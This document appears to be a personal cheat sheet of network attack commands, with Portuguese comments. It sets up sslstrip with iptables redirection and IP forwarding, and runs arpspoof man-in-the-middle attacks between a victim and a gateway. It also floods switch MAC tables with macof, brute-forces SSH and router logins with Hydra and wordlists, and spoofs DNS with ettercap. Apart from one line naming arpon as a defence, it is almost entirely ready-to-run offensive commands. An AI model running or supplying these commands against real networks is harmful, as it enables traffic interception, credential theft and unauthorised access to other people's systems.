echo "1" > /proc/sys/net/ipv4/ip_forward

iṕtables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080

#mandar logar todo trafego na porta 8080
# sslstrip -a -l 8080

#Arpspoof entre a vitima e o gateway
#arpspoof -i eth0 -t 192.168.0.55 192.168.0.1

#em outro term
#arpspoof -i eth0 -t 192.168.0.1 192.168.0.55

#acompanhar o trafego:
#tail -f sslstrip.log

#para se proteger de ataques de spoof arp etc..
#arpon


#dnisiff suite
#macoff  # flodar a tabela dos switcher para o mesmo funcionar como hub.


# ARPSPOOF TUTO basicco

#arpspoof -i eth0 -t < ip da vitima > < ip_que o alvo vai mapear seu MAC>

# o gateway deve se comunica com o host_vitima com o seu MAC, para isso:
#arpspoof -i eth0 -t vamos inverter a ordem de cima dos ips.



#OBS pacotes para instalar aptitude install  sslstrip python-twisted-web


#HYDRA
#hydra -s 22 -l root -p popai1234 192.168.0.53 ssh

#trocar a porta padrao e usar uma lista
#hydra -s 2222 -l root -P /home/tprec/HACK/x/dicFoda -t 64 192.168.0.44 ssh 

# setar ambas wordlist e definir um modo insano, mas parar no primeiro resultado.
#hydra  -s 2222 -L /home/tprec/HACK/Dicionario/users.txt -P /home/tprec/HACK/Dicionarios/x/dicFoda -t 256 -f -vV 192.168.0.66 ssh

#brute force no router
#hydra -s 80 -L users.txt -P dicFoda -t 256 -f -vV 192.168.0.1 http

#ATAQUE de DNS SPOOF  ETTERCAP
# editar o arquivo:
#/etc/ettercap/etter.dns

#adicionar a linha com o site/ip para redirecionamento:
#www.youtube.com	A	127.0.0.1

#ettercap -T -q -M arp -i eth0 -P dns_spoof //

obs: -T  modo texto; -q modo silent; -M arp tipo de redirecionamento; -P dns_spoof  plugin utilizado; // toda rede.

#tutorial ettercap
# www.thegeekstuff.com/2012/05/ettercap-tutorial/

